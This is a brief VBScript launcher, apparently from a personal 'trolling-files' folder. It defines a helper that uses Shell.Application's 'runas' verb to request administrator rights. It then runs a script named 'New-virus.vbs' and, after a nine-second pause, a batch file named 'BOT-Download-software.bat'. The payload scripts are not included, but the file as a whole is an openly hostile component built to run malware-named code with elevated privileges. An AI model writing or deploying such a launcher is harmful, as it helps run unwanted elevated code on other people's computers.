RunAs "wscript.exe","A:\@All-coding-files\@trolling-files\New-virus.vbs",1
WScript.Sleep(9000)
RunAs "A:\@All-coding-files\@trolling-files\BOT-Download-software.bat" ,"cmd.exe",1

Sub RunAs(prog,file,show)
 Set objAPP = CreateObject("Shell.Application")
 objAPP.ShellExecute prog,file,,"runas",show
End Sub